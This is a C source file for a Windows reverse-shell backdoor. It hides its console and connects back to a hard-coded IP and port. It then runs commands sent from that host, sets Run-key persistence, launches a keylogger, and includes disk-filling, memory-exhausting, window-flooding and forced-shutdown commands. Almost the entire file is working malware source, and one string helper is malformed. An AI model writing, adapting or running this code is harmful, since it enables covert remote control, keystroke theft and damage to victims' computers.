#include <stdio.h>
#include <stdlib.h>
#include<dos.h>
#include <unistd.h> 
#include <winsock2.h> 
#include <windows.h> 
#include <winuser.h> 
#include <wininet.h> 
#include <windowsx.h> 
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"
// #include "destroy.h"


#define bzero(p, size) (void) memset((p), 0, (size))

// defining global variables
int sock;

// bootRun function 
int bootRun() 
{
    char err[128] = "Failed\n"; 
    char suc[128] = "Created persistence at : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH]; // MAX_PATH - maximum path lengh limitation on windows - 256 characters 
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);

    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal; 

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0); 
        return -1;
    } 

    DWORD pathLenInBytes = pathLen * sizeof(*szPath); 

    if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal); 
        send(sock, err, sizeof(err), 0); 
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

// function 
char * 
str_cut(char str[], int slice_from, int slice_to)
{
    if (str[0] == '\0')
        return NULL; 

    char *buffer;
    size_t str_len, buffer_len; 

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str); 
        if (abs(slice_to) > str_len - 1) 
            return NULL;

        if (abs(slice_from) > str_len) 
            slice_from = (-1) * str_len; 

        buffer_len = slice_to - slice_from; 
        str += (str_len + slice_from); 
    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str); 

        if (slice_from > str_len - 1) {
            return NULL;

        buffer_len = slice_to - slice_from;
        str += slice_from;

        } else 
            return NULL;

        buffer = calloc(buffer_len, sizeof(char)); 
        strncpy(buffer, str, buffer_len); 
        return buffer; 
    }
}


void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1) {
        jump:
        bzero(buffer, 1024);
        bzero(container, sizeof(container)); 
        bzero(total_response, sizeof(total_response)); 
        recv(sock, buffer, 1024, 0);

// scting compare third arg - number of characters 
        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup(); 
            exit(0);
        } 
        else if (strncmp("cd ", buffer, 3) == 0) {
            chdir(str_cut(buffer, 3, 100));
        } 
        else if (strncmp("persist", buffer, 7) == 0) {
            bootRun();
        }
        else if (strncmp("jam_hdd", buffer, 7) == 0) {
            while(1)
            {
                system("dir>>a.aa.exe");
            }
        }
        else if (strncmp("destroy", buffer, 7) == 0) {
           // destroy();
        }
        else if (strncmp("restart", buffer, 7) == 0) {
            system("shutdown -l -f");
        }
        else if (strncmp("shutdown", buffer, 8) == 0) {
             system("shutdown -s");
        }
        else if (strncmp("full_ram", buffer, 8) == 0) {
            while(malloc( 1000));
        }
        else if (strncmp("start_cmd", buffer, 9) == 0) {
            // Opens an infinite number of command prompt window till the system crushes.
            while(1){
        system("start cmd");
    }
        }
        else if (strncmp("keylog_start", buffer, 12) == 0) {
            // inserting keylogger
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            goto jump;
        }
        else {
            FILE *fp;
            fp = _popen(buffer, "r");
            while(fgets(container, 1024, fp) != NULL){
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp); 
            
        }

    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {

    HWND stealth; // making window not visible
    AllocConsole(); // allocating new console 
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0); // hiding a window and activating another window 

    // Creating socket 
    struct sockaddr_in ServAddr; 
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

// ifconfig  - to find out IP of machine
    ServIP = "172.17.0.2"; //  will listen for incoming connection from backdoor 
    ServPort = 50005; 

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1);
    }

// AF_ITEM - TCPv4, SOCK_STREAM - establishing connection
    sock = socket(AF_INET, SOCK_STREAM, 0); 

    memset(&ServAddr, 0, sizeof(ServAddr)); // clears the variables with zeroes     
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); 
    ServAddr.sin_port = htons(ServPort); 

    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0 ) {
        Sleep(10);
        goto start;
    }
    // messaging the target that windows computer was hacked
    MessageBox(NULL, TEXT("Your device has been hacked!"), TEXT("Windows Instaler"), MB_OK | MB_ICONERROR );
    Shell(); // receives commands from server 

}
